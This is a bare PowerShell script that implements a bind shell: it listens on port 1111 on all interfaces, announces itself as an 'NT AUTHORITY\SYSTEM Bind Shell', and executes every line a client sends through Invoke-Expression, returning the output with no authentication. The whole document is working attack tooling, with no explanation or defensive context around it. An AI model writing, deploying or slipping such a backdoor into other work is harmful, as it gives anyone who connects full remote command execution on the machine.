$tcpListener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', 1111)
$tcpListener.Start()

while ($true) {
    $client = $tcpListener.AcceptTcpClient()
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    
    # Greeting message
    $writer.WriteLine("NT AUTHORITY\SYSTEM Bind Shell")
    $writer.Flush()

    while ($true) {
        $cmd = $reader.ReadLine()
        if ($cmd -eq "exit") {
            break
        }

        # Execute command and return output as string
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    }

    $client.Close()
}

$tcpListener.Stop()

